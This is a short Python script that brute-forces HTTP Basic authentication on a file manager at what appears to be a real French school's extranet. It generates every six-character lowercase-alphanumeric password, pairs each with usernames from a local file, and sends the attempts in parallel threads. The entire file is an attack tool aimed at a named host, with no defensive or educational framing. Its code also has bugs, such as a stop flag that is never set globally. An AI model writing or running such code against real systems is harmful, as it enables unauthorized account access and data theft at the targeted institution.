import requests,base64,threading,time,os
import itertools
import string

chars = string.ascii_lowercase + string.digits
print("generating passwords ..")
passwords = itertools.product(chars, repeat=6)
STOP=False
TRIES=0
def try_auth(password):
    for user in open("/home/benji/users.txt",'r').readlines():
        global TRIES
        auth=base64.b64encode(str(user+":"+password).encode()).decode()
        r=requests.get("https://extranet.lyceelafayette.fr:8443/FileManager/", headers={"Authorization": f"Basic {auth}"})
        TRIES+=1
        if user.encode() in r.content:
            print(f"login found {user}:{password}")
            STOP=True
            return "logged in"
        
        else:
            return "credentials inccorect"
    
import threading
import time

threads = []
max_threads = os.cpu_count()
print("bruteforcing ..")
for password in passwords:
    password = "".join(password)
    if STOP:
        break
    threads = [t for t in threads if t.is_alive()]
    while len(threads) >= max_threads:
        threads = [t for t in threads if t.is_alive()] 
    t = threading.Thread(target=try_auth, args=(password,))
    t.start()
    threads.append(t)




